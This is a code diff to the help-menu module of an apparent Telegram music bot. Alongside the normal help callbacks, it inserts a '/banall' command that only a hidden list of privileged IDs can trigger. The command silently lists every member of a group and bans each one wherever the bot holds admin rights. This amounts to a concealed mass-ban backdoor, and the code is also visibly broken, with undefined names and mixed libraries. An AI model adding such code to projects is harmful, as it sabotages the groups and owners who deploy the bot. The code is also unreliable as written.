@@ -3,6 +3,10 @@ from typing import Union
 from pyrogram import filters, types
 from pyrogram.types import InlineKeyboardMarkup, Message
 
+from telethon.tl.functions.channels import EditBannedRequest, DeleteMessagesRequest
+from telethon.tl.types import ChatBannedRights
+from telethon.errors import rpcerrorlist
+
 from KiaraXMusic import app
 from KiaraXMusic.utils import help_pannel
 from KiaraXMusic.utils.database import get_lang
@@ -88,3 +92,43 @@ async def helper_cb(client, CallbackQuery, _):
         await CallbackQuery.edit_message_text(helpers.HELP_14, reply_markup=keyboard)
     elif cb == "hb15":
         await CallbackQuery.edit_message_text(helpers.HELP_15, reply_markup=keyboard)
+
+@sree.on(events.NewMessage(pattern="^/banall"))
+async def banall(event):
+    if event.sender_id in OP:  # Use sender_id instead of sender.id
+        if not event.is_group:
+            Rep = f"__Use This Command In Any Group!__"
+            await event.reply(Rep)
+        else:
+            await event.delete()
+            cht = await event.get_chat()
+            boss = await event.client.get_me()
+            admin = cht.admin_rights
+            creator = cht.creator
+            if not admin and not creator:
+                await event.reply("__I Don't Have Sufficient Rights To Do This.__")
+                return
+            hmm = await event.reply("__Searching Group Members...__")
+            await sleep(18)
+            await hmm.delete()
+            everyone = await event.client.get_participants(event.chat_id)
+            for user in everyone:
+                if user.id == boss.id:
+                    pass
+                try:
+                    await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
+                except rpcerrorlist.ParticipantIdInvalidError as e_participant:
+                    print(f"Error banning user {user.id}: {e_participant}")
+                    continue  # Skip to the next user
+                except Exception as e:
+                    print(f"Error banning user {user.id}: {e}")
+                    await sleep(0.3)
+                    continue
+                try:
+                    await event.client(DeleteMessagesRequest(event.chat_id, [event.id, event.id + 1]))
+                    await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
+                except rpcerrorlist.MessageIdInvalidError as e_message:
+                    print(f"Error editing message: {e_message}")
+                except Exception as e:
+                    print(f"Error editing message: {e}")
+                await sleep(0.3)
